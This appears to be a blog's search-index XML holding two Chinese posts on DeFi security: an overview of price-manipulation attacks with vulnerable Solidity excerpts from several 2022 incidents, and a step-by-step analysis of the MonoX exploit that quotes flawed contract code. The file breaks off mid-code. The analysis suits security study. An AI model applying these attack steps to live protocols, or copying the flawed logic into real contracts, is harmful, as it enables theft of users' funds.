<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Defi中的价格操纵攻击</title>
    <url>/2023/12/16/Defi%E4%B8%AD%E7%9A%84%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Defi中的价格操纵攻击"><a href="#Defi中的价格操纵攻击" class="headerlink" title="Defi中的价格操纵攻击"></a>Defi中的价格操纵攻击</h1><h2 id="直接价格操纵攻击："><a href="#直接价格操纵攻击：" class="headerlink" title="直接价格操纵攻击："></a>直接价格操纵攻击：</h2><p>某些Defi应用程序具有AMM中交易Token的接口，但是，这些接口如果没有得到适当的保护，则攻击者可以滥用这些接口来代表受攻击的Defi应用程序交易Token，会影响Token对的汇率，然后攻击者可以利用自己的Token进行另一笔交易以获取利益。</p>
<p>Token的价格是通过在AMM中交易Token对来直接操纵的，称为直接价格操纵攻击。‘</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161121807.png" alt="https://pic1.zhimg.com/80/v2-6a170a2bb1213a4bdfd3ad9f98b0bcc8_720w.webp"></p>
<p>上图显示了一个示例。假设池具有与Token对X和Y相同的初始储备金（1，000）。在正常交易中，根据公式（1），用户可以用10 X获得9.9Y。攻击者可以使用以下三个步骤来执行直接价格操纵攻击。</p>
<p>步骤一：价格操纵第一阶段，攻击者使用900 X（占池的大部分）来交换TokenY，这破坏了Token对的余额并提高了TokenY在池中的价格。</p>
<p>步骤二：价格操纵第二阶段，攻击者调用易受攻击的DeFi应用程序的公共界面来出售10X。但是，DeFi应用程序在消耗10 X后只能获得2.75Y。这是因为上一步降低了TokenX的价格。此外，该交易进一步提升了X X的价格。池中TokenY的价格。</p>
<p>步骤三：成本赎回和获利，攻击者通过反向交易出售473 Y，获得905X。那是因为TokenY的价格已在第二步中提高了。这样，攻击者可以获得5倍的利润。</p>
<p>具体来说，第一步是增加TokenY的价格，并降低TokenX在池中的价格。根公式（1），这是预期的行为。但是，第二步使易受攻击的DeFi应用程序出售其TokenX，并进一步提高TokenY的价格。这是通过利用易受攻击的DeFi应用程序的公开接口来实现的。结果，攻击者可以通过出售TokenY进行反向交换，并获得更多的X（本示例中为5）。与正常交易（10 X和9.9 Y）相比，受害者DeFi应用损失了7.15 Y（即7.15 = 9.9 – 2.75）。</p>
<h2 id="间接价格操纵攻击"><a href="#间接价格操纵攻击" class="headerlink" title="间接价格操纵攻击"></a>间接价格操纵攻击</h2><p>一些Defi应用需要出于商业目的使用Token价格，例如，需要一个借款应用程序来计算抵押物的价格，以决定借款人有资格借多少枚Token。如果借款应用程序的价格机制是可操纵的，则借款人所借的Token可能会比抵押品的未偿本金余额更多（即抵押不足）</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161121787.png" alt="https://pic1.zhimg.com/80/v2-9ae2145434d17f36a6c867d59541a16c_720w.webp"></p>
<p>上面的例子中，借款应用程序使用从AMM中获取的Token对的实时汇率（通过调用AMM的智能合约公开的API）来确定抵押物的价值。假设TokenX和Y之间的初始汇率为1：1。在正常借款情况下，由于借款应用程序的抵押物比率为150％，因此用户将1.5个TokenX存入贷方应用程序作为抵押，并借入1个TokenY。攻击者通过以下步骤发起间接价格操纵攻击：</p>
<p>步骤一：价格操纵，攻击者用大量的TokenY来交换TokenX，耗尽了池中很大一部分的TokenX，从而为TokenX产生了虚高的价格。由于借用应用程序的价格机制取决于AMM的实时报价，TokenX的价格也会在借款应用中被夸大。</p>
<p>步骤二：获利，在操纵了TokenX的价格之后，攻击者只需使用TokenX作为抵押品就可以借入TokenY。特别是，他或她可以以与正常借款情况相同的抵押物（1.5 X）借入2 Y而不是1Y。</p>
<p>步骤三：成本补偿，攻击者只需要通过在AMM池中进行反向交换来赎回价格操纵的成本。这种攻击的根本原因是，脆弱的借款应用利用AMM的实时报价来决定抵押物的价格。结果，攻击者可以在AMM的交易池中进行交易以影响Token价格（步骤I），然后从借款应用借入抵押不足的借款（步骤II）。之后，攻击者进行反向交易以赎回成本（步骤III）</p>
<h2 id="1-HEALTH-20221020"><a href="#1-HEALTH-20221020" class="headerlink" title="1. HEALTH -20221020"></a>1. HEALTH -20221020</h2><p>不正确的计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address from, address to, uint256 value) private &#123;</span><br><span class="line">        require(value &lt;= _balances[from]);</span><br><span class="line">        require(to != address(0));</span><br><span class="line">        </span><br><span class="line">        uint256 contractTokenBalance = balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        bool overMinTokenBalance = contractTokenBalance &gt;= numTokensSellToAddToLiquidity;</span><br><span class="line">        if (</span><br><span class="line">            overMinTokenBalance &amp;&amp;</span><br><span class="line">            !inSwapAndLiquify &amp;&amp;</span><br><span class="line">            to == uniswapV2Pair &amp;&amp;</span><br><span class="line">            swapAndLiquifyEnabled</span><br><span class="line">        ) &#123;</span><br><span class="line">            contractTokenBalance = numTokensSellToAddToLiquidity;</span><br><span class="line">            //add liquidity</span><br><span class="line">            swapAndLiquify(contractTokenBalance);</span><br><span class="line">        &#125;</span><br><span class="line">        if (block.timestamp &gt;= pairStartTime.add(jgTime) &amp;&amp; pairStartTime != 0) &#123;</span><br><span class="line">            if (from != uniswapV2Pair) &#123;</span><br><span class="line">                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);  //vulnerable point</span><br><span class="line">                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);  //vulnerable point</span><br><span class="line">                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);  //vulnerable point</span><br><span class="line">                if (block.timestamp &gt;= pairStartTime.add(jgTime)) &#123;</span><br><span class="line">                    pairStartTime += jgTime;</span><br><span class="line">                &#125;</span><br><span class="line">                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);</span><br><span class="line">                IPancakePair(uniswapV2Pair).sync();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>攻击者可以通过多次转移HEALTH代币，以减少Uniswap对中的HEALTH代币，来执行价格操纵。</p>
<p>攻击过程：</p>
<ol>
<li>攻击合约首先通过闪电贷获得大量WBNB，然后通过PancakeRouter交易所兑换HEALTH。</li>
<li>查看攻击过程，发现反复调用HEALTH.transfer，销毁了流动池大量的Health代币</li>
<li>合约调用_transfer时，校验条件太松，销毁流动池中的Health代币，导致Health兑换WBNB价格升高。</li>
</ol>
<h2 id="2-ATK-20221012"><a href="#2-ATK-20221012" class="headerlink" title="2. ATK-20221012"></a>2. ATK-20221012</h2><p>balanceOf函数导致的不正确的价格计算</p>
<p>不安全地使用balanceOf函数，导致很容易收到闪电贷价格操纵的影响</p>
<p>在AST代币合约中使用getPrice()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPrice() public view returns(uint256)&#123;</span><br><span class="line">        uint256 UDPrice;</span><br><span class="line">        uint256 UDAmount  = balanceOf(_uniswapV2Pair); //vulnerable point</span><br><span class="line">        uint256 USDTAmount = USDT.balanceOf(_uniswapV2Pair); //vulnerable point</span><br><span class="line">        UDPrice = UDAmount.mul(10**18).div(USDTAmount);</span><br><span class="line">        return UDPrice;</span><br></pre></td></tr></table></figure>
<h2 id="3-RES-Token-20221006"><a href="#3-RES-Token-20221006" class="headerlink" title="3. RES Token-20221006"></a>3. RES Token-20221006</h2><p>不正确的奖励计算</p>
<p>thisAToB()函数，burn RES代币以提高兑换率</p>
<p>攻击者进行了多次交换以获得奖励ALL代币，并且burn RES代币以提高兑换率</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender, address recipient, uint256 amount) internal &#123;</span><br><span class="line">        require(!_blacklist[tx.origin], &quot;blacklist!&quot;);</span><br><span class="line">        require(!isContract(recipient) || _whiteContract[recipient] || sender == owner() || recipient == owner(), &quot;no white contract&quot;);</span><br><span class="line">        require(sender != address(0), &quot;BEP20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;BEP20: transfer to the zero address&quot;);</span><br><span class="line">        require(recipient != address(this), &quot;transfer fail&quot;);</span><br><span class="line">        require(_allToken != address(0), &quot;no set allToken&quot;);</span><br><span class="line">        if(sender != owner() &amp;&amp; recipient != owner() &amp;&amp; IPancakePair(_swapV2Pair).totalSupply() == 0) &#123;</span><br><span class="line">            require(recipient != _swapV2Pair,&quot;no start&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount, &quot;BEP20: transfer amount exceeds balance&quot;);</span><br><span class="line">        </span><br><span class="line">        bool skip = _isSkip(sender, recipient);</span><br><span class="line">        TransferType transferType = _transferType(sender, recipient);</span><br><span class="line">        </span><br><span class="line">        uint256 amountRecipient = amount;</span><br><span class="line">        if (!_lockSwapFee &amp;&amp; !skip &amp;&amp; transferType != TransferType.TRANSFER)&#123;</span><br><span class="line">            if (transferType == TransferType.SWAP_BUY)&#123;</span><br><span class="line">                if (_isBuySwap(amount))&#123;</span><br><span class="line">                    amountRecipient = amount.mul(uint256(100).sub(_buyFee)).div(100);</span><br><span class="line">                    _distBuyFee(recipient, amount.mul(_buyFee).div(100)); //Get ALLtoken reward</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else if(transferType == TransferType.SWAP_SELL)&#123;</span><br><span class="line">                if (_isSellSwap(amount))&#123;</span><br><span class="line">                    amountRecipient = amount.mul(uint256(100).sub(_sellFee)).div(100);</span><br><span class="line">                    _distSellFee(sender, amount.mul(_sellFee).div(100));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if (transferType == TransferType.TRANSFER)&#123;</span><br><span class="line">            _thisAToB(); //vulnerable point - burn RES</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">function _thisAToB() internal&#123;</span><br><span class="line">        if (_balances[address(this)] &gt; _minAToB)&#123;</span><br><span class="line">            uint256 burnNumber = _balances[address(this)];</span><br><span class="line">            _approve(address(this),_pancakeRouterToken, _balances[address(this)]);</span><br><span class="line">            IPancakeRouter(_pancakeRouterToken).swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">                _balances[address(this)],</span><br><span class="line">                0,</span><br><span class="line">                _pathAToB,</span><br><span class="line">                address(this),</span><br><span class="line">                block.timestamp);</span><br><span class="line">            _burn(_swapV2Pair, burnNumber);  //vulnerable point</span><br><span class="line">            IPancakePair(_swapV2Pair).sync();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-RL-Token-20221001"><a href="#4-RL-Token-20221001" class="headerlink" title="4. RL Token-20221001"></a>4. RL Token-20221001</h2><p>不正确的奖励计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom( </span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public virtual override returns (bool) &#123; </span><br><span class="line">        if (from != address(pancakeSwapV2Pair) &amp;&amp; from != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(from);</span><br><span class="line">        &#125;</span><br><span class="line">        if (to != address(pancakeSwapV2Pair) &amp;&amp; to != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(to); //trace function</span><br><span class="line">        &#125;</span><br><span class="line">        if (msg.sender != address(pancakeSwapV2Pair) &amp;&amp; msg.sender != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(msg.sender); //trace function</span><br><span class="line">        &#125;</span><br><span class="line">        require(allowance(from, msg.sender) &gt;= amount, &quot;insufficient allowance&quot;);</span><br><span class="line">        if (govIDO != address(0)) &#123;</span><br><span class="line">            if (IKBKGovIDO(govIDO).isPriSaler(from)) &#123;</span><br><span class="line">                IKBKGovIDO(govIDO).releasePriSale(from);</span><br><span class="line">            &#125;</span><br><span class="line">            if (IKBKGovIDO(govIDO).isPriSaler(to)) &#123;</span><br><span class="line">                IKBKGovIDO(govIDO).releasePriSale(to);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //sell</span><br><span class="line">        if (to == address(pancakeSwapV2Pair) &amp;&amp; msg.sender == address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            if (!isCommunityAddress[from]) &#123;</span><br><span class="line">                uint burnAmt = amount / 100;</span><br><span class="line">                _burn(from, burnAmt);</span><br><span class="line">                uint slideAmt = amount * 2 / 100;</span><br><span class="line">                _transfer(from, slideReceiver, slideAmt);</span><br><span class="line">                amount -= (burnAmt + slideAmt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (!isCommunityAddress[from] &amp;&amp; !isCommunityAddress[to]) &#123;</span><br><span class="line">                uint burnAmt = amount / 100;</span><br><span class="line">                amount -= burnAmt;</span><br><span class="line">                _burn(from, burnAmt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.transferFrom(from, to, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function distributeAirdrop(address user) public override &#123;</span><br><span class="line">        if (block.timestamp &lt; airdropStartTime) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        updateIndex();</span><br><span class="line">        uint256 rewards = getUserUnclaimedRewards(user); //vulnerable point</span><br><span class="line">        usersIndex[user] = globalAirdropInfo.index;</span><br><span class="line">        if (rewards &gt; 0) &#123;</span><br><span class="line">            uint256 bal = rewardToken.balanceOf(address(this));</span><br><span class="line">            if (bal &gt;= rewards) &#123;</span><br><span class="line">                rewardToken.transfer(user, rewards);</span><br><span class="line">                userUnclaimedRewards[user] = 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">function getUserUnclaimedRewards(address user) public view returns (uint256) &#123;</span><br><span class="line">        if (block.timestamp &lt; airdropStartTime) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        (uint256 newIndex,) = getNewIndex();</span><br><span class="line">        uint256 userIndex = usersIndex[user];</span><br><span class="line">        if (userIndex &gt;= newIndex || userIndex == 0) &#123;</span><br><span class="line">            return userUnclaimedRewards[user];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">				//vulnerable point, Incorrect Reward calculation. only check balanceof of user without any requirement.</span><br><span class="line">            return userUnclaimedRewards[user] + (newIndex - userIndex) * lpToken.balanceOf(user) / PRECISION;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-BXH-20220928"><a href="#5-BXH-20220928" class="headerlink" title="5. BXH -20220928"></a>5. BXH -20220928</h2><p>不正确的奖励计算</p>
<p>错误地使用getReserves()函数来获取池中的余额，并通过getAmountOut来计算bonus</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getITokenBonusAmount( uint256 _pid, uint256 _amountInToken ) public view returns (uint256)&#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line"></span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1, ) = IUniswapV2Pair(pool.swapPairAddress).getReserves(); //vulnerable point</span><br><span class="line">        uint256 amountTokenOut = 0; </span><br><span class="line">        uint256 _fee = 0;</span><br><span class="line">        if(IUniswapV2Pair(pool.swapPairAddress).token0() == address(iToken))&#123;</span><br><span class="line">            amountTokenOut = getAmountOut( _amountInToken , _reserve0, _reserve1, _fee); //vulnerable point</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountTokenOut = getAmountOut( _amountInToken , _reserve1, _reserve0, _fee); //vulnerable point</span><br><span class="line">        &#125;</span><br><span class="line">        return amountTokenOut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut, uint256 feeFactor) private pure returns (uint ) &#123;</span><br><span class="line">        require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">        uint256 feeBase = 10000;</span><br><span class="line"></span><br><span class="line">        uint amountInWithFee = amountIn.mul(feeBase.sub(feeFactor));</span><br><span class="line">        uint numerator = amountInWithFee.mul(reserveOut);</span><br><span class="line">        uint denominator = reserveIn.mul(feeBase).add(amountInWithFee);</span><br><span class="line">        uint amountOut = numerator / denominator;</span><br><span class="line">        return amountOut;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>智能合约</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>Defi安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全--Monox攻击事件分析--phalcon+etherscan</title>
    <url>/2023/12/23/Defi%E5%AE%89%E5%85%A8-Monox%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="MonoX攻击事件相关信息"><a href="#MonoX攻击事件相关信息" class="headerlink" title="MonoX攻击事件相关信息"></a>MonoX攻击事件相关信息</h2><p>在Ethereum和Polygon网络都发生了，攻击手段相同，以Ethereum为例进行分析：</p>
<ul>
<li>攻击者地址：<a href="https://etherscan.io/address/0xecbe385f78041895c311070f344b55bfaa953258#code">MonoX Finance Exploiter | Address 0xecbe385f78041895c311070f344b55bfaa953258 | Etherscan</a></li>
<li><p>攻击合约：<a href="https://etherscan.io/address/0xf079d7911c13369e7fd85607970036d2883afcfd#code">Contract Address 0xf079d7911c13369e7fd85607970036d2883afcfd | Etherscan</a></p>
</li>
<li><p>攻击交易：<a href="https://etherscan.io/tx/0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299">Ethereum Transaction Hash (Txhash) Details | Etherscan</a></p>
</li>
<li>漏洞合约：<a href="https://etherscan.io/address/0x66e7d7839333f502df355f5bd87aea24bac2ee63#code">Monoswap | Address 0x66e7d7839333f502df355f5bd87aea24bac2ee63 | Etherscan</a></li>
</ul>
<h2 id="Monox代码分析及攻击流程讲解"><a href="#Monox代码分析及攻击流程讲解" class="headerlink" title="Monox代码分析及攻击流程讲解"></a>Monox代码分析及攻击流程讲解</h2><h3 id="Monox介绍："><a href="#Monox介绍：" class="headerlink" title="Monox介绍："></a>Monox介绍：</h3><p>与Uniswap不同，其使用的是单边代币池模型，其<code>使用vCash稳定币与AMM提供的代币创建虚拟的交易对</code>。Monox创建的是代币-vCash交易对，添加流动性的时候，只需添加代币，进行任意代币兑换，兑换方式为：<code>代币A -- vCash -- 代币B</code>。</p>
<h3 id="攻击原理及过程："><a href="#攻击原理及过程：" class="headerlink" title="攻击原理及过程："></a>攻击原理及过程：</h3><p>极大地提高Monoswap中Mono代币的价格，后将拥有的Mono代币通过Monoswap换取代币。</p>
<p>具体步骤，查看phalcon上攻击交易的调用序列进行分析</p>
<ol>
<li>前置阶段</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312231712103.png" alt="image-20231223171211651"></p>
<ul>
<li>首先调用<code>WETH</code>的<code>deposit（）</code>函数，向WETH中存入0.1WETH</li>
<li>随后调用<code>approve（）</code>函数，向Monoswap进行授权，以便后续代币兑换正常进行（在foundry中写测试函数时，很容易遗忘approve这点）</li>
<li>随后调用Monoswap的<code>swapExactTokenForToken（）</code>函数，将0.1个WETH换成一定数量的Mono(该函数如何实现，可见漏洞合约<a href="https://etherscan.io/address/0x66e7d7839333f502df355f5bd87aea24bac2ee63#code">Monoswap</a>)</li>
<li>调用Monoswap的<code>pools()</code>函数，具体后续介绍，获得Mono代币在Monoswap中的pid</li>
<li>根据pid调用Monoxpool中的<code>totalSupplyOf()</code>函数，查询Mono-vCash池子中作为LP流动性证明的Mono总量。</li>
</ul>
<ol>
<li>移除用户流动性</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312232154206.png" alt="image-20231223215453923"></p>
<p>在Monox的官方界面可以看到给Mono代币提供代币流动的用户地址，这里从交易序列中可以很明显发现一个漏洞，别的用户的流动性，攻击者竟然可以任意移除</p>
<p>在Monoswap源码中可以很明显发现，并没有流动性所有者进行相应的校验</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _removeLiquidity (address _token, uint256 liquidity,</span><br><span class="line">    address to) view public returns(</span><br><span class="line">    uint256 poolValue, uint256 liquidityIn, uint256 vcashOut, uint256 tokenOut) &#123;</span><br><span class="line">    </span><br><span class="line">    require (liquidity&gt;0, &quot;MonoX:BAD_AMOUNT&quot;);</span><br><span class="line">    uint256 tokenBalanceVcashValue;</span><br><span class="line">    uint256 vcashCredit;</span><br><span class="line">    uint256 vcashDebt;</span><br><span class="line">    PoolInfo memory pool = pools[_token];</span><br><span class="line">    IMonoXPool monoXPoolLocal = monoXPool;</span><br><span class="line">    uint256 lastAdded = monoXPoolLocal.liquidityLastAddedOf(pool.pid, msg.sender);</span><br><span class="line">    </span><br><span class="line">    require((lastAdded + (pool.status == PoolStatus.OFFICIAL ? 4 hours : pool.status == PoolStatus.LISTED ? 24 hours : 0)) &lt;= block.timestamp, &quot;MonoX:WRONG_TIME&quot;); // Users are not allowed to remove liquidity right after adding</span><br><span class="line">    address topLPHolder = monoXPoolLocal.topLPHolderOf(pool.pid);</span><br><span class="line">    require(pool.status != PoolStatus.LISTED || msg.sender != topLPHolder || pool.createdAt + 90 days &lt; block.timestamp, &quot;MonoX:TOP_HOLDER &amp; WRONG_TIME&quot;); // largest LP holder is not allowed to remove LP within 90 days after pool creation</span><br><span class="line"></span><br><span class="line">    (poolValue, tokenBalanceVcashValue, vcashCredit, vcashDebt) = getPool(_token);</span><br><span class="line">    uint256 _totalSupply = monoXPool.totalSupplyOf(pool.pid);</span><br><span class="line"></span><br><span class="line">    liquidityIn = monoXPool.balanceOf(to, pool.pid)&gt;liquidity?liquidity:monoXPool.balanceOf(to, pool.pid);</span><br><span class="line">    uint256 tokenReserve = IERC20(_token).balanceOf(address(monoXPool));</span><br><span class="line">    </span><br><span class="line">    if(tokenReserve &lt; pool.tokenBalance)&#123;</span><br><span class="line">      tokenBalanceVcashValue = tokenReserve.mul(pool.price)/1e18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(vcashDebt&gt;0)&#123;</span><br><span class="line">      tokenReserve = (tokenBalanceVcashValue.sub(vcashDebt)).mul(1e18).div(pool.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if vcashCredit==0, vcashOut will be 0 as well</span><br><span class="line">    vcashOut = liquidityIn.mul(vcashCredit).div(_totalSupply);</span><br><span class="line">    tokenOut = liquidityIn.mul(tokenReserve).div(_totalSupply);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>攻击者发现三个主要提供流动性的用户，先调用Monoxpool的<code>balanceOf（）</code>函数查看地址在Monoswap中的Mono数量，后调用移除流动性函数，使得池子中的Mono为0.</p>
<ol>
<li>添加流动性</li>
</ol>
<p>攻击者自己添加极少的Mono代币到Monoswap中，获得927个LP，为后续拉升Mono的价格做准备</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312232203080.png" alt="image-20231223220301534"></p>
<ol>
<li>拉高Mono代币在Monoswap中的价格</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312232208153.png" alt="image-20231223220818186"></p>
<p>攻击交易中，重复了55次上述行为</p>
<p>先是调用Monoswap中的<code>pools()</code>函数，从中我们可以看出solidity中这种mapping映射的获得，是通过调用函数的形式活动，可以看一下该函数返回的函数类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping (address =&gt; PoolInfo) public pools;</span><br><span class="line">  struct PoolInfo &#123;</span><br><span class="line">    uint256 pid;</span><br><span class="line">    uint256 lastPoolValue;</span><br><span class="line">    address token;</span><br><span class="line">    PoolStatus status;</span><br><span class="line">    uint112 vcashDebt;</span><br><span class="line">    uint112 vcashCredit;</span><br><span class="line">    uint112 tokenBalance;</span><br><span class="line">    uint256 price; // over 1e18</span><br><span class="line">    uint256 createdAt; // timestamp</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注的是我们可以通过调用该函数获得该代币在Monoswap中的<code>tokenBalance</code>余额和<code>price</code>当前价格，攻击交易这里主要想获得池子中的tokenBalance余额。</p>
<p>随后查看攻击者先前用0.1个WETH兑换的Mono代币的余额，即还剩多少个</p>
<p>随后最关键的步骤调用Monoswap的<code>swapExactTokenForToken()</code>函数，这个函数的功能与uniswap很像，顾名思义，将精准数量的代币兑换成一定数量的另一种代币，这里我们能够很明显发现，参数<code>tokenIn</code>和<code>tokenOut</code>都是Mono，这就是攻击手段！</p>
<p>所以肯定是该函数中存在漏洞，导致Mono代币价格的拉高。进入函数中看一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokenForToken(</span><br><span class="line">  address tokenIn,</span><br><span class="line">  address tokenOut,</span><br><span class="line">  uint amountIn,</span><br><span class="line">  uint amountOutMin,</span><br><span class="line">  address to,</span><br><span class="line">  uint deadline</span><br><span class="line">) external virtual ensure(deadline) returns (uint amountOut) &#123;</span><br><span class="line">  amountOut = swapIn(tokenIn, tokenOut, msg.sender, to, amountIn);</span><br><span class="line">  require(amountOut &gt;= amountOutMin, &#x27;MonoX:INSUFF_OUTPUT&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function swapIn (address tokenIn, address tokenOut, address from, address to,</span><br><span class="line">    uint256 amountIn) internal lockToken(tokenIn) returns(uint256 amountOut)  &#123;</span><br><span class="line"></span><br><span class="line">  address monoXPoolLocal = address(monoXPool);</span><br><span class="line"></span><br><span class="line">  amountIn = transferAndCheck(from,monoXPoolLocal,tokenIn,amountIn); </span><br><span class="line">  </span><br><span class="line">  // uint256 halfFeesInTokenIn = amountIn.mul(fees)/2e5;</span><br><span class="line"></span><br><span class="line">  uint256 tokenInPrice;</span><br><span class="line">  uint256 tokenOutPrice;</span><br><span class="line">  uint256 tradeVcashValue;</span><br><span class="line">  </span><br><span class="line">  (tokenInPrice, tokenOutPrice, amountOut, tradeVcashValue) = getAmountOut(tokenIn, tokenOut, amountIn);</span><br><span class="line"></span><br><span class="line">  uint256 oneSideFeesInVcash = tokenInPrice.mul(amountIn.mul(fees)/2e5)/1e18;</span><br><span class="line"></span><br><span class="line">  // trading in</span><br><span class="line">  if(tokenIn==address(vCash))&#123;</span><br><span class="line">    vCash.burn(monoXPoolLocal, amountIn);</span><br><span class="line">    // all fees go to the other side</span><br><span class="line">    oneSideFeesInVcash = oneSideFeesInVcash.mul(2);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    _updateTokenInfo(tokenIn, tokenInPrice, 0, tradeVcashValue.add(oneSideFeesInVcash), 0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // trading out</span><br><span class="line">  if(tokenOut==address(vCash))&#123;</span><br><span class="line">    vCash.mint(to, amountOut);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if (to != monoXPoolLocal) &#123;</span><br><span class="line">      IMonoXPool(monoXPoolLocal).safeTransferERC20Token(tokenOut, to, amountOut);</span><br><span class="line">    &#125;</span><br><span class="line">    _updateTokenInfo(tokenOut, tokenOutPrice, tradeVcashValue.add(oneSideFeesInVcash), 0, </span><br><span class="line">      to == monoXPoolLocal ? amountOut : 0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if(pools[tokenIn].vcashDebt &gt; 0 &amp;&amp; pools[tokenIn].status == PoolStatus.OFFICIAL)&#123;</span><br><span class="line">    _internalRebalance(tokenIn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit Swap(to, tokenIn, tokenOut, amountIn, amountOut, tradeVcashValue);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>swapIn函数较复杂，我们可以从后往前看，看到它有个<code>_updateTokenInfo()</code>函数，更新token的信息，看一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _updateTokenInfo (address _token, uint256 _price,</span><br><span class="line">    uint256 _vcashIn, uint256 _vcashOut, uint256 _ETHDebt) internal &#123;</span><br><span class="line">  uint256 _balance = IERC20(_token).balanceOf(address(monoXPool));</span><br><span class="line">  _balance = _balance.sub(_ETHDebt);</span><br><span class="line">  require(pools[_token].status!=PoolStatus.PAUSED,&quot;MonoX:PAUSED&quot;);</span><br><span class="line">  require(_balance &lt;= uint112(-1));</span><br><span class="line">  (uint initialPoolValue, , ,) = getPool(_token);</span><br><span class="line">  pools[_token].tokenBalance = uint112(_balance);</span><br><span class="line">  pools[_token].price = _price;</span><br><span class="line"></span><br><span class="line">  // record last trade&#x27;s block number in mapping: lastTradedBlock</span><br><span class="line">  lastTradedBlock[_token] = block.number;</span><br><span 